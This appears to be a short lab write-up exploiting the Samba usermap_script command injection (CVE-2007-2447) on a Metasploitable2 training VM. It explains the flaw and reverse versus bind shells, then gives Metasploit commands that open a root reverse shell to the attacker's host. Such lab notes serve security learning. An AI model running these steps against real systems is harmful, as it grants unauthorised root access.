# Metasploitable2 -- Samba usermap_script

## CVE
CVE-2007-2447

## Target
- IP: 192.168.110.3
- Service: Samba 3.x
- Port: 139/tcp

## Background
Samba 3.0.20 through 3.0.25 contains a command injection vulnerability
in the username field. When the "username map script" option is enabled,
Samba passes the username to /bin/sh without sanitizing it first.
An attacker can inject shell commands directly into the username.

## Key Concept -- Reverse Shell vs Bind Shell
- Bind shell: target opens a port, attacker connects to it
- Reverse shell: target connects back to attacker
Reverse shells bypass firewalls that block incoming connections.

## Exploitation (Metasploit)
```bash
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.110.3
set LHOST 192.168.110.5
run
# session opens automatically
whoami  # root
```

## Takeaway
RHOSTS is the target (remote). LHOST is your machine (local).
Metasploit embeds LHOST inside the payload so the target knows
where to connect back to. Wrong LHOST = no shell.
